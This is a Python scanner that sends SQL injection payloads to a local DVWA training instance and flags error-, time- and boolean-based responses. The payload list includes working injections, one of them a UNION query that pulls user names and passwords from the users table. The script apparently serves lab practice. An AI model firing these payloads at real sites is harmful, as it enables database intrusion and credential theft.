import requests
from bs4 import BeautifulSoup
import time

# Configure for DVWA (update port and cookie!)
TARGET_URL = "http://127.0.0.1:42001/vulnerabilities/sqli/"  # Use :8080 if needed
PHPSESSID = "lch11hrpbf6gqiu8pjjv0oi1da"  # Replace with your DVWA cookie
SECURITY = "low"

# SQLi payloads
PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT user, password FROM users--",
    "1' ORDER BY 1--",
    "1' AND 1=2--",
    "1' OR '1'='1",
    "1' UNION SELECT user(), database()-- ",
    "1' AND SLEEP(5)-- ",
    "1' OR 1=1-- "
]

headers = {
    "Cookie": f"PHPSESSID={PHPSESSID}; security={SECURITY}"
}

def test_sqli(url, param_name, payload):
    try:
        params = {param_name: payload}
        response = requests.get(url, params=params, headers=headers, timeout=10)
        return response.text, response.elapsed.total_seconds()
    except Exception as e:
        print(f"Error: {e}")
        return None, 0

def scan_sql_injection(url, params_to_test):
    vulnerabilities = []
    normal_response, normal_time = test_sqli(url, params_to_test[0], "1")
    if normal_response is None:
        print("❌ Failed to connect to the target. Check if DVWA is running!")
        return vulnerabilities
    
    for param in params_to_test:
        for payload in PAYLOADS:
            print(f"Testing {param} with payload: {payload}")
            response, response_time = test_sqli(url, param, payload)
            
            if response is None:
                continue
            
            # Error-Based Detection (MySQL-specific)
            if "MySQL" in response or "SQL syntax" in response:
                print(f"🔥 Vulnerable (Error-Based): {param} with {payload}")
                vulnerabilities.append((param, payload, "Error-Based"))
            
            # Time-Based Detection
            if response_time >= 3:
                print(f"⏰ Vulnerable (Time-Based): {param} with {payload}")
                vulnerabilities.append((param, payload, "Time-Based"))
            
            # Boolean-Based Detection (look for "admin" or "ID")
            soup_test = BeautifulSoup(response, "html.parser")
            if "admin" in soup_test.get_text().lower() or "ID" in soup_test.get_text():
                print(f"🔍 Vulnerable (Boolean-Based): {param} with {payload}")
                vulnerabilities.append((param, payload, "Boolean-Based"))
            
            time.sleep(1)
    
    return vulnerabilities

if __name__ == "__main__":
    parameters = ["id"]
    print(f"Scanning {TARGET_URL}...")  # This is line 61 - ensure quotes are closed
    vulns = scan_sql_injection(TARGET_URL, parameters)
    
    if not vulns:
        print("No vulnerabilities found. Check setup steps!")
    else:
        print("\nFound vulnerabilities:")
        for vuln in vulns:
            print(f"- Parameter: {vuln[0]}, Payload: {vuln[1]}, Type: {vuln[2]}")